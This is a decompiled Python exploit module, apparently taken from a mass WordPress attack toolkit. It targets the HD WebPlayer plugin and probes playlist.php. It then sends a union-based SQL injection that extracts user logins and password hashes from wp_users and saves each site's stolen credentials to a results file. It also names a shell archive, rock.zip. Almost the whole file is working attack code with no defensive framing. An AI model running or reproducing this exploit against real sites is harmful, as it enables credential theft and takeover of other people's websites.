# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\Wp_HD_WebPlayer.py
import requests
import re
from Exploits import printModule
MailPoetZipShell = 'files/rock.zip'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'
   }

def Exploit(site):
    try:
        check = requests.get('http://' + site + '/wp-content/plugins/hd-webplayer/playlist.php', timeout=10, headers=Headers)
        if '<?xml version="' in check.content:
            Exploit = '/wp-content/plugins/hd-webplayer/playlist.php?videoid=1+union+select+1,2,concat(user_login,0x3a,user_pass),4,5,6,7,8,9,10,11+from+wp_users--'
            GoT = requests.get('http://' + site + Exploit, timeout=10, headers=Headers)
            User_Pass = re.findall('<title>(.*)</title>', GoT.content)
            username = User_Pass[1].split(':')[0]
            password = User_Pass[1].split(':')[1]
            with open('result/Sqli_result.txt', 'a') as writer:
                writer.write('------------------------------\nDomain: ' + str(site) + '\nUsername: ' + str(username) + '\nPassword: ' + str(password) + '\n')
            return printModule.returnYes(site, 'N/A', 'hd-webplayer', 'Wordpress')
        return printModule.returnNo(site, 'N/A', 'hd-webplayer', 'Wordpress')
    except:
        return printModule.returnNo(site, 'N/A', 'hd-webplayer', 'Wordpress')